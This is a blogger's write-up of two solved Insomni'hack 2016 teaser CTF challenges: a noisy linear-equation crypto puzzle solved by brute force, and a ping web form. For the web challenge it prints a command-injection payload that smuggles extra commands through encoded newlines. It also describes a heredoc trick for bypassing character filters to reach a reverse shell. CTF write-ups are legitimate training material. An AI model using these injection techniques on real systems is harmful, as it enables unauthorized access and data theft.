# Isomni'hack Teaser CTF

I have a new years resolution to participate in at least 10 CtF competitions this year. This teaser was the first event in 2016, so despite some time restrictions this weekend I wanted to give it a go.


# Isomni'hack Teaser CTF

I have a new years resolution to participate in at least 10 CtF competitions
this year. This teaser was the first event in 2016, so despite some time restrictions
this weekend I wanted to give it a go.

I ended up placed #126 out of the #838 that registers and #245 who scored. I completed
2 out of the 8 flags. This wasn't too bad a showing, but it could have been better.

Below are some of my notes from this round:

# Bring the noise - Crypto - 200 pts 

This was the first challenge I solved, it was a fairly simple crypto/maths 
problem.

The server was guarded by a simple md5 partial collision (5 bytes).

After that the server presented the client with 40 arrays of 7 numbers. The first
6 numbers were coefficients used in a calculation, and the 7th was the result.

The calculation itself was fairly simple:

        def learn_with_vibrations():
            q, n, eqs = 8, 6, 40
            solution = [randint(q) for i in range(n)] #Generate 6 random numbers
            equations = []
            for i in range(eqs):
                coefs = [randint(q) for i in range(n)] #Generate 6 random numbers
                result = sum([solution[i]*coefs[i] for i in range(n)]) % q # times the 2 together
                vibration = randint(3) - 1 # vibration is either 0-2-1 =  -1 0 1
                result = (result + q + vibration) % q 
                equations.append('%s, %d' % (str(coefs)[1:-1], result))
            return equations, solution
   
All the client had to do was check each possible combination against the 40 output
arrays. Through the method the client could eliminate combinations which couldn't
be combined with the given coefficients to produce the results.

Hacky go code follows:

        func check_possible(n int, coeff []int) bool {
            poss := generate_possibility(n) 
            result := 0;
            for i:=0;i<6;i+=1 {
                result += poss[i] * coeff[i]
            }
            result0 := (result + 8) %8
            result1 := (result + 9) %8
            result2 := (result + 7) %8
            if result0 == coeff[6] || result1 == coeff[6] || result2 == coeff[6] {
                return true
            } else {
                return false
            } 
        }

And the output, once integrated:

        Found Collision:  c6174c16048193a4c40ab9d9ba1fd23b RticC
        After  0  rounds found : 98304  possibilities
        After  1  rounds found : 36864  possibilities
        After  2  rounds found : 13824  possibilities
        After  3  rounds found : 5376  possibilities
        After  4  rounds found : 2016  possibilities
        After  5  rounds found : 756  possibilities
        After  6  rounds found : 282  possibilities
        After  7  rounds found : 106  possibilities
        After  8  rounds found : 39  possibilities
        After  9  rounds found : 14  possibilities
        After  10  rounds found : 5  possibilities
        After  11  rounds found : 1  possibilities
        After  12  rounds found : 1  possibilities
        After  13  rounds found : 1  possibilities
        After  14  rounds found : 1  possibilities
        After  15  rounds found : 1  possibilities
        After  16  rounds found : 1  possibilities
        After  17  rounds found : 1  possibilities
        After  18  rounds found : 1  possibilities
        After  19  rounds found : 1  possibilities
        After  20  rounds found : 1  possibilities
        After  21  rounds found : 1  possibilities
        After  22  rounds found : 1  possibilities
        After  23  rounds found : 1  possibilities
        After  24  rounds found : 1  possibilities
        After  25  rounds found : 1  possibilities
        After  26  rounds found : 1  possibilities
        After  27  rounds found : 1  possibilities
        After  28  rounds found : 1  possibilities
        After  29  rounds found : 1  possibilities
        After  30  rounds found : 1  possibilities
        After  31  rounds found : 1  possibilities
        After  32  rounds found : 1  possibilities
        After  33  rounds found : 1  possibilities
        After  34  rounds found : 1  possibilities
        After  35  rounds found : 1  possibilities
        After  36  rounds found : 1  possibilities
        After  37  rounds found : 1  possibilities
        After  38  rounds found : 1  possibilities
        229502 [7 0 0 1 7 6]
        After maths found solution: 7, 0, 0, 1, 7, 6
        Response  INS{ErrorsOccurMistakesAreMade}


# SmartCat 1 - Web 50 pts

The puzzle is rather simple; we are given a webform which allows you to ping a provided
host.

Simple command injection doesn't work charactes like ` &{$(;` and others are not allowed.

However, it is possible to use `\n` to execute multiple commands, and redirections are still available.

After some exploring through the filesystem, I came up with:

        127.0.0.1>/dev/null%0AHOME=./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/%0Acd%0Acat<flag

Which provided the flag:

        INS{warm_kitty_smelly_kitty_flush_flush_flush}`

# Things That Went Less Well

* SmartCat 2: This puzzle took place in the same environment as SmartCat1. In the end it required a shell which despite my best efforts I couldn't work out how to do with the limited character availability.
* Every other puzzle: I didn't spend much time on the others, mostly due to time restrictions.

# Things I Learned

* A new way of crafting a reverse shell; there were lots of ways of completing smartcat2. Some of thw writeups
I have seen used the CGI environment variables, which I didn't consider. Others used this technique which I didn't know about:

        python>test.py<<EOF
        print"this\x20is\x20a\x20test"
        EOF

Basically, python and Bash's EOF is used to write commands to a filename dynamically. This bypasses all of the character restrictions (because you can use \x notation), and in the end you have a script which can do basically anything - including executing a reverse shell.

* I'll update this section as I read through the [writeups](https://github.com/ctfs/write-ups-2016/tree/master/insomnihack-teaser-2016) in more detail.


